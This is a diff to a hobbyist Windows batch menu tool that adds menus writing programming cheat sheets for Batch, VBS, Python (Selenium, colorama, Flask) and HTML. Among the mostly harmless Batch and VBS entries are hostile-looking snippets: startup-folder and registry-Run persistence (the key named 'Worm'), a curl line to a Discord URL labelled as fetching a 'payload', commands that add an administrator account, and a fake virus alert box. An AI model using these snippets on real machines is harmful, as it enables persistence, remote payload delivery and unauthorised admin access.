@@ -200,7 +200,9 @@ echo 6) TeamSilencium Videos
 echo 7) Robux Codes Video
 echo 8) Infos
 echo 9) Username Info
-echo 10) Close
+echo 10) ProgrammingLanguage
+echo 11) test
+echo 12) Close
 echo.
 echo.
 echo                                                                                                     [Made By Marv492005]
@@ -214,7 +216,9 @@ if %MainMenu% == 6 goto Videos
 if %MainMenu% == 7 goto RobuxCodes
 if %MainMenu% == 8 goto Info
 if %MainMenu% == 9 goto Password3
-if %MainMenu% == 10 goto start
+if %MainMenu% == 10 goto ProgrammingLanguage
+if %MainMenu% == 11 goto test
+if %MainMenu% == 12 goto start
 goto MainMenu
 
 :Options
@@ -957,6 +961,424 @@ if %UsernameInfo% == 1 start https://whatsmyname.app/
 if %UsernameInfo% == 2 goto MainMenu
 goto UsernameInfo
 
+:ProgrammingLanguage
+cls
+title Choose your programming language
+md ProgrammingLanguage
+echo 1) Batch
+echo 2) VBS
+echo 3) Python
+echo 4) HTML
+echo 5) C-Sharp
+echo.
+echo.
+echo 6) close
+set /p ProgrammingLanguage=choose: 
+if %ProgrammingLanguage% == 1 goto Batch
+if %ProgrammingLanguage% == 2 goto VBS
+if %ProgrammingLanguage% == 3 goto Python
+if %ProgrammingLanguage% == 4 goto HTML
+if %ProgrammingLanguage% == 5 goto CSharp
+if %ProgrammingLanguage% == 6 goto MainMenu
+goto ProgrammingLanguage
+
+:Batch
+cls
+cd C:\Users\%Username%\Desktop\ProgrammingLanguage
+echo Befehl	       			  Funktion >ProgrammingBatch.txt
+echo shutdown -s			shutdowns the pc >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo shutdown -r			restarts the pc >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo shutdown -l			logout >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo shutdown -a			stopps the shutdown	 >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo - t xx				time bevore the shutdown happens >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo - f	               		closes everything without warning >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo shutdown -s -t 1800 -f 		shutdowns the pc after 1800 seconds and closes all windows >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo timeout 100    			wait bevore executes the code under it >>ProgrammingBatch.txt
+echo >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo cls 				clears the cmd text >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------------------------------------------------------ >>ProgrammingBatch.txt
+echo set /p hello=			options per text >>ProgrammingBatch.txt
+echo if %hello%==yes goto yes >>ProgrammingBatch.txt
+echo if %hello%==no goto no >>ProgrammingBatch.txt
+echo :yes >>ProgrammingBatch.txt
+echo :no >>ProgrammingBatch.txt
+echo -------------------------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo ipconfig/all			shows ip informations  >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo ping url 			shows the ip from the webside  >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo @mode con cols=35 lines=7 	changes the size of the cmd >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo title  				changes the title of the cmd >>ProgrammingBatch.txt
+echo -------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo cd C:\Users\%username%\Desktop\der ordner\       goes to the path >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"     copys the file in startup >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------------------------------ >>ProgrammingBatch.txt
+echo > NUL    			makes commands invisible >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo text > test.txt 		speichert den davorstehenden text in einer .txt oder erstetzt ihn wenn bereits die datei vorhanden ist >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo das was drin steht >> Text.txt  speichert den davorstehenden text in einer .txt oder fügt ihn zu einer bereits vorhandenen datei hinzu >>ProgrammingBatch.txt
+echo -------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo :start								password system >>ProgrammingBatch.txt
+echo cls >>ProgrammingBatch.txt
+echo echo Gebe bitte das Passwort ein. >>ProgrammingBatch.txt
+echo set /P passwort="Passwort: " >>ProgrammingBatch.txt
+echo if "%passwort%"=="baum1810" goto richtig >>ProgrammingBatch.txt
+echo cls >>ProgrammingBatch.txt
+echo echo Passwort falsch! >>ProgrammingBatch.txt
+echo ping /n 3 localhost >NUL >>ProgrammingBatch.txt
+echo goto start >>ProgrammingBatch.txt
+echo :richtig >>ProgrammingBatch.txt
+echo goto admin pannel >>ProgrammingBatch.txt
+echo exit >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo cmd <text.txt			executes the commands from a txt >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo %%%				print % >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo ^ 				lässt vieles printen (muss vor dem zeichen oder zahl stehen die ohne nicht geprintet wird) >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo %username%			gets the local username >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------ >>ProgrammingBatch.txt
+echo if exist file.txt 		sucht ob die file.txt in dem ordern/ pfad vorhanden ist >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo goto 				goes to a variable >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo taskkill /im explorer.exe /f 	kills a running programm >>ProgrammingBatch.txt
+echo -------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo @echo off			schaltet die textliche ausgabe jedes befehles aus >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo md ordername			creates a folder >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo start notepad.exe		starts a programm or webside >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo Date 1.1.1999			changes the date >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo Time 12:00:52,08		changes the time >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo RUNDLL32 USER32.DLL,SwapMouseButton	swap mouse buttons >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo del /s /q "C:\Users\%username%\AppData\Local\Temp" delets the file or folder >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo copy "C:\Users\%username%\Desktop\try.txt" "C:\Users\%username%\Downloads\tryy.txt"		copys the file in the folder (with the name) >>ProgrammingBatch.txt
+echo -------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo ren cd C:\Users\%username%\Desktop try.txt test.txt		renames the file >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo PING 1.1.1.1 -n 1 -w 0.6 >NUL	 	timeout version with milliseconds >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo %random%			generates a random number >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo color				changes the color of the text/cmd >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo tree				zeigt den stamm baum aller ordner an >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo msg * message			opens a message box >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo pause				pauses the cmd >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo net user			shows all users >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo net user username * 		changes the password of the account >>ProgrammingBatch.txt
+echo -------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo net localgroup			shows all local groups >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------------------------ >>ProgrammingBatch.txt
+echo net user name passwort /add	adds a new account >>ProgrammingBatch.txt
+echo -------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo net localgroup Administratoren name /add 	gib den angegebenen accound administrator rechte >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo ipconfig /release 		gibt alle verbindungen frei (man hat kein internet) >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo ipconfig /renew 		renew all adapter >>ProgrammingBatch.txt
+echo -------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo CMD 				starts a command promt >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo EXIT				Exits the programm >>ProgrammingBatch.txt
+echo ------------------------------------------------------------------ >>ProgrammingBatch.txt
+echo SYSTEMINFO			shows informations about the pc >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo net user administrator /active:yes activates the administrator account >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo net user (net username) /active:yes activate/dectivate the account mit /yes oder /no >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo @echo off >>ProgrammingBatch.txt
+echo set isadmin=0								--check if someone execute it with admin or without >>ProgrammingBatch.txt
+echo whoami /all | findstr /c:" S-1-16-12288 ">nul && set isadmin=1 >>ProgrammingBatch.txt
+echo IF %isadmin% EQU 1 ( >>ProgrammingBatch.txt
+echo 	goto ask >>ProgrammingBatch.txt
+echo ) ELSE ( >>ProgrammingBatch.txt
+echo 	ECHO Error: Please run this file as Administrator >>ProgrammingBatch.txt
+echo 	@pause >>ProgrammingBatch.txt
+echo 	exit >>ProgrammingBatch.txt
+echo ) >>ProgrammingBatch.txt
+echo --------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo findstr /m "word" test.txt 								       --looks if the word is in the txt >>ProgrammingBatch.txt
+echo if %errorlevel%==0 ( >>ProgrammingBatch.txt
+echo >>ProgrammingBatch.txt
+echo word is in the list >>ProgrammingBatch.txt
+echo pause >>ProgrammingBatch.txt
+echo >>ProgrammingBatch.txt
+echo ) >>ProgrammingBatch.txt
+echo >>ProgrammingBatch.txt
+echo echo word is not in the list >>ProgrammingBatch.txt
+echo >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo curl https://cdn.discordapp.com/attachments/766391552816971807/828752831258689616/test.bat   --downloads and starts the file from the discord link (payload) >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo set /a awnser=1+1 >>ProgrammingBatch.txt
+echo echo %awnser%										     --calculates the given numbers >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo ATTRIB +H note.txt									     --hides the file (not works if u can see hided files) ((+ adds is - deletes it)) >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo FC D:\a.txt D:\b.txt									     --compares 2 files and shows the difrent >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo MORE D:\example.txt									     --shows the content of a file line by line >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo SORT D:\example.txt									     --shorts the file alphabetically >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo REM note										     --code after REM didnt get executet >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo SETLOCAL >>ProgrammingBatch.txt
+echo the code u want										     --can be used to use the same variable name multible times >>ProgrammingBatch.txt
+echo ENDLOCAL >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo FOR /F  %%text IN (abc.txt) DO echo hi							     --executes the code for every text in the txt >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo echo.											     --creates a empty line >>ProgrammingBatch.txt
+echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
+echo whoami /all										     --Display user, group and privileges for the current user. >>ProgrammingBatch.txt
+echo ----------------------------------------------------------------------------------							 >>ProgrammingBatch.txt
+timeout 1 >NUL
+goto ProgrammingLanguage
+
+:VBS
+cls
+echo X=MsgBox("hello your pc have a virus",0+16,"hacker")		--Error message box >VBSProgramming.txt
+echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
+echo WScript.Echo("Hello")						--Message box >>VBSProgramming.txt
+echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
+echo WshShell.SendKeys "Hello world"					--sends keys >>VBSProgramming.txt
+echo WshShell.SendKeys "{ENTER}" >>VBSProgramming.txt
+echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
+echo Set WshShell = WScript.CreateObject("WScript.Shell")		--needed bevore anything with WshShell >>VBSProgramming.txt
+echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
+echo WScript.Sleep 500 						--waits bevore the script continues (milliseconds) >>VBSProgramming.txt
+echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
+echo WshShell.Run "notepad.exe"					--starts a programm >>VBSProgramming.txt
+echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
+echo Set ws = CreateObject("WScript.Shell") >>VBSProgramming.txt
+echo ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm", "wscript.exe c:\windows\file.bat %" 	--regedit startup >>VBSProgramming.txt
+timeout 2 >NUL
+goto ProgrammingLanguage
+
+:Python
+cls
+title Python Programming
+echo 1) Python 1
+echo 2) Python 2
+echo 3) Python 3
+echo. 
+echo.
+echo 4) close
+set /p Python=choose:
+if %Python% == 1 goto Python1
+if %Python% == 2 goto Python2
+if %Python% == 3 goto Python3
+if %Python% == 4 goto ProgrammingLanguage
+goto Python
+
+:Python1
+cls
+echo #allow/ disallow notifications >Python1.txt
+echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo from selenium import webdriver >>Python1.txt
+echo from selenium.webdriver.chrome.options import Options >>Python1.txt
+echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo option = Options() >>Python1.txt
+echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo option.add_argument("--disable-infobars") >>Python1.txt
+echo option.add_argument("start-maximized") >>Python1.txt
+echo option.add_argument("--disable-extensions") >>Python1.txt
+echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo # Pass the argument 1 to allow and 2 to block >>Python1.txt
+echo option.add_experimental_option("prefs", {  >>Python1.txt
+echo     "profile.default_content_setting_values.notifications": 1  >>Python1.txt
+echo }) >>Python1.txt
+echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo driver = webdriver.Chrome(chrome_options=option, executable_path='chromedriver.exe') >>Python1.txt
+echo driver.get('url') >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #starts the browser maxi/minimized >>Python1.txt
+echo options.add_argument("start-maximized") >>Python1.txt
+echo options.add_argument("start-minimized") >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #finds the element by the xpath >>Python1.txt
+echo test = driver.find_element_by_xpath('the xpath') >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #sends the keys >>Python1.txt
+echo test.send_keys("text") >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #clicks on the variable >>Python1.txt
+echo test.click() >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #headless Edge >>Python1.txt
+echo options = EdgeOptions() >>Python1.txt
+echo options.use_chromium = True >>Python1.txt
+echo options.add_argument("headless") >>Python1.txt
+echo options.add_argument("disable-gpu") >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #makes a screenshot of the webside and saves the picture in the folder >>Python1.txt
+echo driver.get_screenshot_as_file("name.png") >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #driver opens the url >>Python1.txt
+echo driver.get("https://youtube.com") >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #activates/deactivates chrome settings >>Python1.txt
+echo opt = Options() >>Python1.txt
+echo opt.add_argument("--disable-infobars") >>Python1.txt
+echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo opt.add_argument("--disable-extensions") >>Python1.txt
+echo # Pass the argument 1 to allow and 2 to block >>Python1.txt
+echo opt.add_experimental_option("prefs", { \ >>Python1.txt
+echo     "profile.default_content_setting_values.media_stream_mic": 1,  >>Python1.txt
+echo     "profile.default_content_setting_values.media_stream_camera": 1, >>Python1.txt
+echo     "profile.default_content_setting_values.geolocation": 2,  >>Python1.txt
+echo     "profile.default_content_setting_values.notifications": 2  >>Python1.txt
+echo   }) >>Python1.txt
+echo driver = webdriver.Chrome(executable_path='chromedriver.exe', chrome_options=opt) >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #mutes the browser >>Python1.txt
+echo options.add_argument("--mute-audio") >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #http proxys >>Python1.txt
+echo options.add_argument('--proxy-server=%s' % PROXY) >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #minimizes the driver >>Python1.txt
+echo driver.minimize_window() >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #prints the curent url >>Python1.txt
+echo url = driver.current_url(); >>Python1.txt
+echo print(url) >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #refreshes the driver >>Python1.txt
+echo driver.refresh() >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #closes the driver >>Python1.txt
+echo driver.Quit() >>Python1.txt
+echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
+echo #addons >>Python1.txt
+echo chrome_options.add_extension('path_to_extension') >>Python1.txt
+timeout 1 >NUL
+goto Python
+
+:Python2
+cls
+echo import colorama >Python2.txt
+echo from colorama import Fore, Back, Style >>Python2.txt
+echo colorama.init(autoreset=True) >>Python2.txt
+echo ------------------------------------------------------------------------------------------------------------- >>Python2.txt
+echo print('\033[31m' + 'some red text') >>Python2.txt
+echo print('\033[39m')  # and reset to default color >>Python2.txt
+echo print() >>Python2.txt
+echo print(f"{Fore.RED}C{Fore.GREEN}O{Fore.YELLOW}L{Fore.BLUE}O{Fore.MAGENTA}R{Fore.CYAN}S{Fore.WHITE}!") >>Python2.txt
+echo print(f"{Fore.RED}Red Text") >>Python2.txt
+echo print(f"{Fore.GREEN}Green Text") >>Python2.txt
+echo print(f"{Fore.YELLOW}Yellow Text") >>Python2.txt
+echo print(f"{Fore.BLUE}Blue Text") >>Python2.txt
+echo print(f"{Fore.MAGENTA}Magenta Text") >>Python2.txt
+echo print(f"{Fore.CYAN}Cyan Text") >>Python2.txt
+echo print(f"{Fore.WHITE}White Text") >>Python2.txt
+echo print() >>Python2.txt
+echo print(f"{Back.RED}B{Back.GREEN}A{Back.YELLOW}C{Back.BLUE}K{Back.MAGENTA}G{Back.CYAN}R{Back.WHITE}O{Back.RED}U{Back.GREEN}N{Back.YELLOW}D{Back.BLUE}!") >>Python2.txt
+echo print(f"{Back.RED}Red Background") >>Python2.txt
+echo print(f"{Back.GREEN}Green Background") >>Python2.txt
+echo print(f"{Back.YELLOW}Yellow Background") >>Python2.txt
+echo print(f"{Back.BLUE}Blue Background") >>Python2.txt
+echo print(f"{Back.MAGENTA}Magenta Background") >>Python2.txt
+echo print(f"{Back.CYAN}Cyan Background") >>Python2.txt
+echo print(f"{Back.WHITE}White Background") >>Python2.txt
+echo print() >>Python2.txt
+echo print(f"{Style.DIM}S{Style.NORMAL}T{Style.BRIGHT}Y{Style.DIM}L{Style.NORMAL}E{Style.BRIGHT}!") >>Python2.txt
+echo print(f"{Style.DIM}Dim Text") >>Python2.txt
+echo print(f"{Style.NORMAL}Normal Text") >>Python2.txt
+echo print(f"{Style.BRIGHT}Bright Text") >>Python2.txt
+echo print() >>Python2.txt
+echo print(f"{Fore.YELLOW}{Back.RED}C{Back.GREEN}{Fore.RED}O{Back.YELLOW}{Fore.BLUE}M{Back.BLUE}{Fore.BLACK}B{Back.MAGENTA}{Fore.CYAN}I{Back.CYAN}{Fore.GREEN}N{Back.WHITE}A{Back.RED}T{Back.GREEN}I{Back.YELLOW}O{Back.BLUE}N") >>Python2.txt
+echo print(f"{Fore.GREEN}{Back.YELLOW}{Style.BRIGHT}Green Text - Yellow Background - Bright") >>Python2.txt
+echo print(f"{Fore.CYAN}{Back.WHITE}{Style.DIM}Cyan Text - White Background - Dim") >>Python2.txt
+echo ------------------------------------------------------------------------------------------------------------------- >>Python2.txt
+echo ''' >>Python2.txt
+echo Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET. >>Python2.txt
+echo Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET. >>Python2.txt
+echo Style: DIM, NORMAL, BRIGHT, RESET_ALL >>Python2.txt
+echo ''' >>Python2.txt
+timeout 1 >NUL
+goto Python
+
+:Python3
+cls
+echo from flask import Flask, render_template, redirect, send_file, make_response >Python3
+echo app = Flask(__name__) >>Python3.txt
+echo @app.route('/test/') #the path wich will be used in the url >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo @app.route('/test/<string:name>/')  #arguments can be passed over the url >>Python3.txt
+echo def gettoken(name): >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo return redirect("https://google.com") #redirects the visitor to the givven webside >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo return "test"    # returns the message on a blank page >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo return send_file("test.txt") #displays the content of a file on the webside >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo @app.errorhandler(404) >>Python3.txt
+echo def page_not_found(e): #what should happen if a link dosnt exist >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo app.run(debug=False,host='0.0.0.0', port=8000) #start the webside on the given host and port >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo app = Flask(__name__, template_folder='template') #displayes the file on the webside >>Python3.txt
+echo @app.route('/', methods = ['GET', 'POST']) >>Python3.txt
+echo def Index(): >>Python3.txt
+echo     return render_template('base.html') >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo @app.route('/', methods = ['GET', 'POST']) #main link
+echo def Index(): >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo @app.route('/download_file') #downloadable file >>Python3.txt
+echo def download_file(): >>Python3.txt
+echo     path = "test.txt" >>Python3.txt
+echo     return send_file(path,as_attachment=True) >>Python3.txt
+echo ################################################################ >>Python3.txt
+echo resp = make_response() >>Python3.txt
+echo resp.set_cookie('somecookiename', 'I am cookie') #creates the cookie >>Python3.txt
+echo cookie = request.cookies.get('somecookiename') #reads the cookie >>Python3.txt
+timeout 1 >NUL
+goto Python
+
+:HTML
+cls
+echo <h1> Title from webside </h1>				--Title from websides >HTMLProgramming.txt
+echo -------------------------------------------------------------- >>HTMLProgramming.txt
+echo <head> ... </head>					-- >>HTMLProgramming.txt
+echo -------------------------------------------------------------- >>HTMLProgramming.txt
+echo <strong> … </strong>					--makes the text stronger >>HTMLProgramming.txt
+echo -------------------------------------------------------------- >>HTMLProgramming.txt
+echo <html> .. <html>					--one html at the start and one at the end >>HTMLProgramming.txt
+echo -------------------------------------------------------------- >>HTMLProgramming.txt
+echo <button> ... </button>					--creates a button >>HTMLProgramming.txt
+echo -------------------------------------------------------------- >>HTMLProgramming.txt
+echo <body style="background-image:url(background.jpg)"> 	--sets a backround >>HTMLProgramming.txt
+timeout 1 >NUL
+goto ProgrammingLanguage
+
 :Goodbye
 cls
 title Bis bald %username%
@@ -1064,4 +1486,3 @@ timeout 1 >NUL
 del %userprofile%\AppData\Local\Temp\welcome.vbs
 msg * Man sieht sich.
 goto exit
-
